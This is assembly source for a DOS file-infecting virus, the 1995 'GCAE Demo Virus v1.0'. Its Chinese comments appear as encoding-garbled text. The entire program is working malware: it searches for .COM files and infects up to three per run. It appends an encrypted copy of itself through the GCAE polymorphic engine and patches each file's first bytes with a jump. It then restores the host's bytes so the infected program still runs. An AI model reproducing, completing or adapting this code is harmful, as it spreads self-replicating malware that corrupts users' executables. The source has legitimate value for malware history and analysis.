


;       This is [GCAE] Demo Virus v1.0
;  Written by Golden Cicada in Taipei, Taiwan.
;      (C) Copyright CVEX Corp. , 1995.

        .286
        .model  small
        .code

        extrn   GCAE:near,GCAE_E:near   ;*** ³o¦æ­n°O±o­n¥[... ***

start:
        jmp short begin

wrt_dat db 0aeh,0e9h
jmp_addr dw ?
head_dat db 4h dup(?)                ;«O¦s³Q·P¬VÀÉ®×¶}ÀYªº4 bytes
find_name db '*.COM',00h             ;¥u·P¬VCOMÀÉ
dta_buf db 30h dup(?)                ;DTA¸ê®Æ°Ï

begin:
        call get_adr
get_adr:
        pop si                          ;±o¨ì°¾²¾¶q
        sub si,OFFSET get_adr
        mov di,si
        and di,0fff0h                   ;ÅÜ¦¨16ªº­¿¼Æ,«K©ó­«©w¦ì...
        mov ax,di
        mov cl,04h
        shr ax,cl
        mov cx,cs
        add ax,cx
        push ax
        mov ax,OFFSET retf_to
        push ax
        mov cx,OFFSET GCAE_E            ;cx:=(¯f¬rªø«×+GCAE¼Ò²Õ)
        cld
        rep movsb
        retf                            ;­«©w¦ì...
retf_to:
        push cs
        pop ds
        mov si,OFFSET head_dat
        xor di,di
        cmp BYTE PTR head_dat,00h
        jz first
        mov di,0100h
        push di
        movsw                           ;«ì´_­ìÀÉ®×¶}ÀY...
        movsw                           ;
        pop di
first:
        push es                         ;¼È¦sPSPªºSegment...
        push di
        push es
        mov ah,1ah
        mov dx,OFFSET dta_buf
        int 21h
        mov si,0003h                    ;¤@¦¸·P¬V¤T­ÓCOMÀÉ
        mov ah,4eh
        mov cx,0003h
        mov dx,OFFSET find_name
        int 21h
        jnc to_infect
        jmp short find_end
find_loop:
        mov ah,4fh
        int 21h
        jc find_end
to_infect:
        call infect                     ;·P¬VÀÉ®×
        dec si
        jnz find_loop
find_end:
        pop es                          ;¨ú¦^PSPªºSegment...
        push es
        pop ds
        mov dx,80h
        mov ah,1ah
        int 21h
        retf                            ;°õ¦æ­ìÀÉ®×...

infect  proc
        mov dx,OFFSET dta_buf+1eh
        mov ax,3d02h
        int 21h                         ;¶}ÀÉ(READ/WRITÅª¼g¼Ò¦¡)
        xchg bx,ax
        mov ah,3fh
        mov cx,0004h
        mov dx,OFFSET head_dat
        int 21h                         ;Åª¨ú4 bytes¦Ühead_dat
        inc si
        cmp BYTE PTR head_dat,0aeh
        je close_file
        dec si
        push si
        xor cx,cx
        xor dx,dx
        mov ax,4202h                    ;²¾°ÊÅª¼g«ü¼Ð¨ìÀÉ®×§À
        int 21h
        push bx
        mov bx,ax
        add bx,0100h                    ;*** COM ÀÉªº®æ¦¡ ***
        sub ax,0004h
        mov jmp_addr,ax
        mov ax,OFFSET GCAE_E+0fh
        mov cl,04h
        shr ax,cl
        mov cx,cs
        add ax,cx
        mov es,ax
        mov cx,OFFSET GCAE_E            ;*** ³Q½s½Xªº¯f¬rªø«× ***
        mov dx,OFFSET start
        call GCAE                       ;*** ©I¥sÅÜºA¼Ò²Õ
        pop bx
        mov ah,40h
        int 21h                         ;¼gÀÉ...
        push cs
        pop ds
        xor cx,cx
        xor dx,dx
        mov ax,4200h
        int 21h
        mov ah,40h
        mov cx,0004h
        mov dx,OFFSET wrt_dat
        int 21h
        pop si
close_file:
        mov ah,3eh                      ;ÃöÀÉ...
        int 21h
        ret
infect  endp

        end start


